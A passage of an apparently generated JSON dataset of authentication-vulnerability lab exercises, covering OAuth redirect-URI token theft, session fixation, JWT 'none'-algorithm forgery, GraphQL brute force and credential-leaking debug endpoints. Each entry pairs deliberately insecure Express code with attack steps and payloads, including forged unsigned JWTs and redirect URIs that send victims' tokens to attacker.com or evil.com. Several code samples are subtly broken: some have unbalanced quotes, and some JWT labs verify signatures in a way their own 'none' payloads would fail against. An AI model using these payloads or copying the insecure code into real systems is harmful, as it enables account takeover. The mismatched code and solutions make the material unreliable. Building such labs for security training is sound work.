    "Lab Description": "This lab uses OAuth 2.0 implicit flow for authentication. The access token is returned in the URL fragment. However, the application leaks this token via the Referer header when navigating to external domains. To solve: capture Carlos's access token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Host a malicious external site and trick the victim into clicking a crafted OAuth login link with a redirect URI pointing to your domain.",
      "When the victim logs in, the OAuth server redirects with the access token in the URL fragment.",
      "The victim’s browser follows a resource on your page that causes the Referer header to leak the full URL including the access token.",
      "Capture the token in your server logs or listener.",
      "Use Postman or Burp to send a GET /profile request with Authorization: Bearer [captured_token] to access Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth && tokens[auth.replace('Bearer ', '')] === 'carlos') { res.send('Carlos profile page'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000);",
    "payloads": [
      "https://vulnerable-app.com/oauth/callback#access_token=carlos-token",
      "GET /profile HTTP/1.1\\nAuthorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login endpoint",
    "Lab Description": "The application improperly manages session identifiers. It accepts a pre-assigned session value from an unauthenticated user and reuses it post-login. The application does not regenerate the session ID after authentication, allowing an attacker to predetermine a session token. To solve: Hijack Carlos's session using a fixed session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite Proxy to intercept a request to /login before authentication and note the Set-Cookie header.",
      "Manually set a session ID value and send a GET /login request using Burp Repeater, observe that the session persists.",
      "Send the malicious session ID to Carlos via social engineering or use XSS to force session adoption.",
      "Log in as Carlos using his credentials while reusing the fixed session ID on your end.",
      "Navigate to /my-account with the hijacked session to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=post action=/login>Username:<input name=username>Password:<input name=password><input type=submit></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sid=attackerSession123",
      "POST /login HTTP/1.1\\nCookie: sid=attackerSession123\\nusername=carlos&password=letmein"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm in authorization token",
    "Lab Description": "The application uses JWTs for session management but improperly trusts the `alg` header value in incoming tokens. If the algorithm is changed to 'none', the signature is not validated. The application decodes and trusts the payload blindly. To solve: Forge a valid JWT for Carlos and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a legitimate JWT from a login request.",
      "Decode the JWT using jwt.io or Burp Decoder and examine the payload structure.",
      "Replace the `alg` value in the header with 'none' and set `username` to 'carlos'.",
      "Remove the signature section and send the forged token in Authorization header.",
      "Send a GET /my-account request with the new token and verify access as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const body = JSON.parse(Buffer.from(payload.payload, 'base64').toString()); if (body.username === 'carlos') return res.send('Account details for carlos'); } const decoded = jwt.verify(token, secret); if (decoded.username === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(JWT None Bypass Lab running on http://localhost:' + PORT));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI handling",
    "Lab Description": "The application uses OAuth for authentication but does not strictly validate the `redirect_uri` parameter during the OAuth handshake. An attacker can supply a malicious redirect URI to intercept access tokens. To solve: Gain an access token for Carlos and access his account page using the compromised session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth handshake and examine the `redirect_uri` parameter.",
      "Craft an OAuth authorization URL with a redirect_uri pointing to attacker.com/callback.",
      "Host a listener on attacker.com/callback to capture incoming requests and tokens.",
      "Trick Carlos into clicking the malicious OAuth link to initiate the login process.",
      "Extract the access token from the captured request and use it in Authorization header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'access-token-for-carlos'; const uri = `${redirect_uri}?token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'access-token-for-carlos') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(OAuth Redirect URI Lab running on http://localhost:' + PORT));",
    "payloads": [
      "GET /auth?redirect_uri=https://attacker.com/callback",
      "Captured access-token-for-carlos via attacker.com/callback?token=access-token-for-carlos",
      "GET /my-account?token=access-token-for-carlos"
    ]
  },
    {
      "Lab scenario": "Web Application Session Fixation in Login Endpoint",
      "Lab Description": "The application uses a fixed session ID supplied by the client and does not regenerate the session upon login, exposing it to session fixation attacks. The application logs verbose error details and maintains insecure session management. To solve: exploit the session fixation vulnerability to hijack Carlos's session and access his account page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the GET /login request and capture the session cookie.",
        "2. Validate that the session ID remains unchanged during authentication by comparing the session cookie before and after login.",
        "3. Craft a request in Postman with a fixed session ID (e.g. attacker-session-id) in the URL or cookie header.",
        "4. Exploit by injecting the fixed session ID into the login flow using Burp Repeater.",
        "5. Verify successful session hijack by accessing /my-account and observing account details."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); let sessions = {}; let users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || req.query.sid || 'default-session'; sessions[sid] = { authenticated: false }; console.log('Session ID:', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { let sid = req.cookies.sid || req.query.sid || 'default-session'; let { username, password } = req.body; let user = users.find(u => u.username === username && u.password === password); if(user){ sessions[sid] = { authenticated: true, username: username }; console.log('User authenticated:', username); res.redirect('/my-account'); } else { console.log('Authentication failed for:', username); res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { let sid = req.cookies.sid || req.query.sid || 'default-session'; if(sessions[sid] && sessions[sid].authenticated){ res.send('Account details for ' + sessions[sid].username); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('Server running'));",
      "payloads": [
        "http://target.com/login?sid=attacker-session-id",
        "Cookie: sid=attacker-session-id",
        "POST /login with fixed sid parameter using Burp Repeater"
      ]
    },
    {
      "Lab scenario": "Web API JWT Tampering in Token Validation",
      "Lab Description": "The application issues JWT tokens for authentication but fails to properly validate the token signature, allowing attackers to modify the payload without proper checks. The application logs detailed error information exposing debugging data. To solve: tamper with the JWT to impersonate Carlos and access his secure endpoints.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Postman to authenticate and capture a valid JWT token from the /login endpoint.",
        "2. Decode the JWT using an online tool such as jwt.io to inspect the header and payload.",
        "3. Craft a modified token by changing the payload (set username to 'carlos') and switching the algorithm to 'none'.",
        "4. Use Burp Suite Repeater to send the modified token in the Authorization header to /my-account.",
        "5. Verify that the server accepts the tampered token and returns Carlos's account data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); let secret = 'supersecret'; let users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { let { username, password } = req.body; let user = users.find(u => u.username === username && u.password === password); if(user){ let token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); console.log('Generated token for', username); res.json({ token: token }); } else { console.log('Login failed for', username); res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { let auth = req.headers.authorization; if(auth){ let token = auth.split(' ')[1]; try { let decoded = jwt.verify(token, secret, { ignoreExpiration: true }); console.log('Token verified for', decoded.username); res.send('Secure data for ' + decoded.username); } catch(e){ console.log('JWT verification error:', e.message); res.status(403).send('Access denied'); } } else { res.status(401).send('No token provided'); } }); app.listen(4000, () => console.log('Server running'));",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\"}",
        "Unsigned token: base64UrlEncode(header) + '.' + base64UrlEncode(payload) + '.'",
        "Authorization: Bearer <modified-token>"
      ]
    },
    {
      "Lab scenario": "Web OAuth Misconfiguration in Redirect URI",
      "Lab Description": "The application uses OAuth for authentication but fails to validate redirect URIs, allowing an attacker to redirect tokens to an external domain. The application provides verbose logging that discloses sensitive redirection data. To solve: manipulate the redirect_uri parameter to capture Carlos's access token and use it to access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP to intercept the OAuth authorization flow and inspect the redirect_uri parameter.",
        "2. Validate the misconfiguration by modifying the redirect_uri parameter to point to an attacker-controlled domain.",
        "3. Craft a malicious redirect URL that captures the access token using Burp Suite.",
        "4. Exploit the vulnerability by sending the malicious URL to the victim via a crafted phishing email.",
        "5. Verify the token capture and use the token in a subsequent request to /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); let users = [{ username: 'carlos', token: 'access-token-carlos' }]; app.get('/auth', (req, res) => { let redirect = req.query.redirect_uri; console.log('Redirect URI:', redirect); res.redirect(redirect + '#access_token=' + users[0].token); }); app.get('/my-account', (req, res) => { let auth = req.headers.authorization; if(auth === 'Bearer access-token-carlos'){ console.log('Access granted for Carlos'); res.send('Carlos account details'); } else { console.log('Access denied'); res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('Server running'));",
      "payloads": [
        "https://victim.com/auth?redirect_uri=https://attacker.com/steal",
        "https://attacker.com/steal#access_token=access-token-carlos",
        "Authorization: Bearer access-token-carlos"
      ]
    },
    {
      "Lab scenario": "JWT tampering in authorization header",
      "Lab Description": "This lab features an API that authorizes users using JWT tokens stored in the Authorization header. The JWT token is signed using the HS256 algorithm, but the application fails to enforce the secret key properly and does not validate algorithm type. The application trusts JWT tokens signed with the 'none' algorithm. To solve: Forge a valid token that grants admin privileges and access the /admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.Use Postman or Burp to intercept a request containing the JWT token in the Authorization header.",
        "2.Validate the JWT structure using jwt.io to confirm the algorithm and payload content.",
        "3.Edit the JWT header to use 'alg':'none' and remove the signature part of the token.",
        "4.Inject a new payload with \"role\":\"admin\" and re-encode the token without a signature.",
        "5.Send the modified token via Postman to the /admin endpoint and verify access is granted."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.role === 'admin') { return res.send('Welcome, admin user'); } else { return res.status(403).send('Forbidden'); } } catch (e) { return res.status(400).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Auth Lab running on port 3000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "{\"alg\":\"none\"}.{\"username\":\"carlos\",\"role\":\"admin\"}."
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow",
      "Lab Description": "This lab demonstrates session fixation where the session identifier is not regenerated upon login. The application accepts a user-provided session cookie before login and continues using it after authentication. This allows an attacker to pre-assign a session ID and hijack a victim's session. To solve: Fixate a known session ID on the victim, then log in as the victim using the same session ID to gain access.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite to craft a GET /login request that sets a custom session cookie (e.g., session=attack123).",
        "2.Send the malicious link to the victim containing the pre-fixed session ID.",
        "3.Victim logs in, attaching the attacker-controlled session to their authenticated session.",
        "4.Attacker reuses the same session ID (attack123) to access the /dashboard endpoint as the victim.",
        "5.Verify access to the victim's account and retrieve sensitive information."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('body-parser').urlencoded({ extended: true })); const users = { carlos: { password: 'password123' } }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username]?.password === password) { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); sessions[sessionId] = username; res.cookie('session', sessionId); res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const username = sessions[req.cookies.session]; if (username) { res.send(`Dashboard for ${username}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
      "payloads": [
        "GET /login HTTP/1.1\\nCookie: session=attack123",
        "POST /login HTTP/1.1\\nCookie: session=attack123\\nusername=carlos&password=password123"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in redirect URI",
      "Lab Description": "This lab includes an OAuth implementation where the redirect URI is insufficiently validated. The server accepts open redirects and allows redirection to attacker-controlled domains. The vulnerable OAuth client trusts unvalidated parameters. To solve: Leak a valid OAuth authorization code to an attacker-controlled domain.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite or a browser to initiate the OAuth flow via /auth?client_id=lab-client&redirect_uri=https://attacker.com/callback.",
        "2.Capture the generated authorization URL containing the attacker-controlled redirect_uri.",
        "3.Present this URL to the victim (simulated by browser or API request).",
        "4.Upon login, the victim is redirected to https://attacker.com/callback with a valid code.",
        "5.Extract the authorization code from the attacker callback to complete the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id === 'lab-client') { const authCode = 'valid-auth-code'; const redirect = `${redirect_uri}?code=${authCode}`; console.log('Redirecting to:', redirect); res.redirect(redirect); } else { res.status(400).send('Invalid client'); } }); app.listen(3000, () => console.log('OAuth Redirect Lab running on port 3000'));",
      "payloads": [
        "https://labsite.com/auth?client_id=lab-client&redirect_uri=https://evil.com/callback",
        "GET /auth?client_id=lab-client&redirect_uri=https://attacker.net/grab"
      ]
    },
    {
      "Lab scenario": "JWT signature manipulation in Authorization header",
      "Lab Description": "This lab uses stateless JWTs for user authentication with HMAC signatures. The application trusts the 'alg' field in the token without proper validation. To solve: tamper with the JWT token to impersonate the admin user and access the /admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.Use Burp Suite to intercept a login request and extract the JWT from the Authorization header.",
        "2.Copy the token and decode it using jwt.io or Burp Decoder.",
        "3.Modify the payload to change the 'user' claim to 'admin' and the 'alg' field to 'none'.",
        "4.Remove the signature section entirely and reassemble the JWT header and payload.",
        "5.Replace the original Authorization header with the manipulated JWT and access /admin to confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, 'secretkey'); } catch (e) { console.log('JWT verification failed:', e); } } next(); }); app.get('/admin', (req, res) => { if (req.user?.user === 'admin') res.send('Welcome to admin panel'); else res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('JWT lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake-signature"
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID",
      "Lab Description": "This lab suffers from a session fixation flaw. The server allows clients to supply a session ID via URL, which is not regenerated after login. To solve: fix the session for the victim, then log them in and hijack their session to access /my-account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.With OWASP ZAP, craft a GET request to /login?session=attacker-session-id and open the resulting login form.",
        "2.Use credential stuffing to log in as the victim in the same session ID.",
        "3.Once logged in, close the session.",
        "4.Reuse the same session ID in your own browser to access /my-account.",
        "5.Verify access by confirming the victim's username is shown."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const session = req.query.session || Math.random().toString(36).substring(7); res.cookie('sid', session); res.send('<form method=\"POST\" action=\"/login\">Login here</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; sessions[sid] = { user: 'carlos' }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.user === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
      "payloads": [
        "/login?session=abc123",
        "Set-Cookie: sid=abc123; path=/"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration exposing authorization code",
      "Lab Description": "This lab simulates a third-party OAuth login integration using an insecure redirect URI. The application accepts arbitrary redirect URIs, enabling interception of authorization codes. To solve: capture an authorization code meant for the victim and exchange it to access the victim's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Postman to simulate an OAuth login flow and inspect the redirect URI after successful authorization.",
        "2.Exploit the redirect_uri parameter to point to an attacker-controlled endpoint.",
        "3.Log in as the victim and complete the OAuth flow, capturing the authorization code on your server.",
        "4.Exchange the code manually via a direct POST to the token endpoint and obtain an access token.",
        "5.Use the token to impersonate the victim and access /account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const code = 'authcode-' + user; tokens[code] = user; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) res.json({ access_token: 'token-' + user }); else res.status(400).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = token?.split('-')[1]; if (user) res.send(`Account info for ${user}`); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "/auth?user=carlos&redirect_uri=http://attacker.com/capture",
        "POST /token with code=authcode-carlos",
        "Authorization: Bearer token-carlos"
      ]
    },
    {
      "Lab scenario": "JWT tampering in Authorization header",
      "Lab Description": "The application uses JWTs to authenticate users but does not verify their integrity properly. The secret key is weak and predictable. The application uses the token to authorize access to admin-only features. To solve: Forge a valid token for the admin user and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept and analyze the Authorization: Bearer header after logging in as a normal user.",
        "Decode the JWT using jwt.io and identify its algorithm as 'HS256' with 'user': 'guest'.",
        "Brute-force the weak secret using jwt_tool.py or hashcat against a common wordlist.",
        "Craft a new JWT with payload {\"user\":\"admin\"} and sign it using the discovered secret.",
        "Replace the Authorization header with the new token and access /admin to verify access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'mysecret'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Token required'); const decoded = jwt.verify(token, SECRET); if (decoded.user !== 'admin') return res.status(403).send('Forbidden'); res.send('Welcome admin!'); }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
        "Modified JWT with {\"alg\":\"HS256\",\"user\":\"admin\"} signed using 'mysecret'"
      ]
    },
    {
      "Lab scenario": "Session fixation via static session ID in cookie",
      "Lab Description": "The application uses a predictable session ID issued before authentication and does not regenerate it upon login. To solve: Fixate a session on the victim and log in with their account using the fixed session cookie.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using OWASP ZAP, monitor cookies set during the login process and confirm sessionID remains unchanged.",
        "Manually visit the site as an unauthenticated user and capture the Set-Cookie value.",
        "Trick the victim into logging in while using the attacker's fixed session ID (e.g., via iframe or phishing).",
        "After victim logs in, reuse the same session ID in your browser to access their authenticated content.",
        "Visit /account and verify that it shows victim-specific content."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36); res.cookie('sid', sid); sessions[sid] = sessions[sid] || {}; res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sid; sessions[sid].user = username; res.send('Logged in'); } else { res.status(403).send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]?.user; if (user) res.send(`Account: ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "Pre-assigned session ID: attacker sets sid=abc123 and sends victim phishing URL with that cookie",
        "Session reuse after victim login with sid=abc123"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in third-party login",
      "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate the `state` parameter, exposing it to CSRF-like attacks. To solve: Exploit the flow to log in as another user by hijacking their OAuth session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept the OAuth login flow using Burp Suite and observe that 'state' is either missing or reused.",
        "Initiate an OAuth flow with your own account and capture the final redirect URL containing the 'code'.",
        "Send the redirect URL to the victim with a spoofed state or hijack their browser with the link.",
        "Upon victim completing OAuth, their access code is redirected to the attacker's origin.",
        "Replay the captured code with your own session to become authenticated as the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const fetch = require('node-fetch'); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; const tokenResp = await fetch('https://oauth-provider/token', { method: 'POST', body: `code=${code}` }); const token = await tokenResp.text(); res.cookie('token', token); res.send('Logged in'); }); app.listen(3000);",
      "payloads": [
        "https://target.com/oauth/callback?code=validVictimCode",
        "Replay victim's code without verifying `state`"
      ]
    },
    {
      "Lab scenario": "GraphQL login brute-force with verbose error feedback",
      "Lab Description": "The GraphQL API provides detailed error messages and lacks rate-limiting. A login mutation exposes different errors for invalid usernames and passwords. To solve: Enumerate a valid username, then brute-force the password.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to send GraphQL login mutations and analyze error messages for invalid usernames.",
        "Automate username brute-force via script or Burp Intruder with GraphQL queries.",
        "Once a valid username is found (error changes), switch to password brute-forcing.",
        "Identify successful login by error message absence or token returned.",
        "Use returned token to access authenticated GraphQL query and verify access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const users = { carlos: 's3cret' }; const schema = buildSchema(`type Query { login(username: String!, password: String!): String }`); const root = { login: ({ username, password }) => { if (!users[username]) throw new Error('Username not found'); if (users[username] !== password) throw new Error('Incorrect password'); return 'token-abc123'; } }; const app = express(); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4000);",
      "payloads": [
        "{ login(username: \"admin\", password: \"wrong\") }",
        "{ login(username: \"carlos\", password: \"s3cret\") }"
      ]
    },
    {
      "Lab scenario": "Verbose logging reveals valid credentials",
      "Lab Description": "The backend logs contain full authentication requests and responses, including credentials. These logs are exposed via a debug endpoint. To solve: Locate and extract admin credentials from logs, then log in and access /admin.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Browse the /debug/logs endpoint using Burp Suite and check for verbose output.",
        "Identify entries like POST /login containing plaintext usernames and passwords.",
        "Find an entry where 'username=admin' and note the password.",
        "Login via POST /login using the stolen credentials.",
        "Access /admin and verify you have admin privileges."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); let logs = []; app.use(bodyParser.urlencoded({ extended: true })); const users = { admin: 'adminpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; logs.push(`LOGIN ATTEMPT: ${username}:${password}`); if (users[username] === password) res.send('Logged in'); else res.status(403).send('Denied'); }); app.get('/debug/logs', (req, res) => { res.send(logs.join('\\n')); }); app.get('/admin', (req, res) => { res.send('Admin Dashboard'); }); app.listen(3000);",
      "payloads": [
        "Visit /debug/logs to retrieve: LOGIN ATTEMPT: admin:adminpass",
        "POST /login with admin:adminpass"
      ]
    },
    {
      "Lab scenario": "JWT tampering in REST API authentication flow",
      "Lab Description": "The application uses stateless JWTs to authenticate users on its REST API. However, the backend fails to validate the token signature properly. The application accepts unsigned tokens or those signed with a known weak key. To solve: tamper with a valid JWT to escalate privileges and access the admin panel.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to capture the Authorization Bearer JWT from a successful login.",
        "Decode the token using jwt.io and observe the 'alg' is set to 'HS256'. Try changing it to 'none'.",
        "Modify the payload to {\"role\":\"admin\"} and remove the signature part, then resend the token in the Authorization header.",
        "If that fails, use a wordlist with `jwt_tool` to brute-force the HMAC secret (e.g., 'secret', 'admin', etc.) and sign a tampered token with 'admin' privileges.",
        "Access the /api/admin endpoint with the forged token and verify the response contains admin-level content."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = { alice: 'password1', admin: 'adminpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username, role: username === 'admin' ? 'admin' : 'user' }, 'secret'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome admin'); res.status(403).send('Forbidden'); }); app.listen(3000);",
      "payloads": [
        "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"role\":\"admin\"}",
        "JWT signed with HMAC 'secret' and payload {\"role\":\"admin\"}"
      ]
    },
    {
      "Lab scenario": "Session fixation in login redirection flow",
      "Lab Description": "The application assigns a session ID before the user is authenticated and fails to regenerate the session after login. This allows an attacker to fix a victim’s session ID prior to authentication. To solve: Fix a known session and take over the victim’s account after they log in.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to capture the Set-Cookie: sessionId response when visiting the login page.",
        "Send the fixed sessionId to the victim via a crafted link using an open redirect or iframe injection.",
        "Wait for the victim to log in using the fixed session ID.",
        "Re-use the same sessionId in your browser to hijack the session.",
        "Access /my-account to confirm the takeover."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { carlos: 'securepass' }; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sessionId', sid); res.sendFile(__dirname + '/login.html'); }); app.post('/login', (req, res) => { const sid = req.cookies.sessionId; const { username, password } = req.body; if (users[username] === password) { sessions[sid].username = username; sessions[sid].authenticated = true; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionId]; if (session?.authenticated) return res.send(`Account: ${session.username}`); res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "Crafted link with fixed sessionId: http://target.com/login?sessionId=attacker123",
        "Burp-modified Set-Cookie header replay with known sessionId"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in third-party provider login",
      "Lab Description": "The app uses OAuth 2.0 with a third-party provider (e.g., GitHub) for authentication. However, the client fails to validate the issuer and audience of the returned access token. To solve: Forge a token from a malicious OAuth server and gain access to another user's session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to observe the OAuth login flow and identify the token exchange endpoint.",
        "Set up a fake OAuth server using mitmproxy or Evilginx2 that returns self-issued tokens with arbitrary 'sub' and 'email' fields.",
        "Initiate login via the legitimate flow, intercept the token request, and replay it to your fake server.",
        "Inject a token claiming to be the victim (e.g., sub: carlos, email: carlos@example.com).",
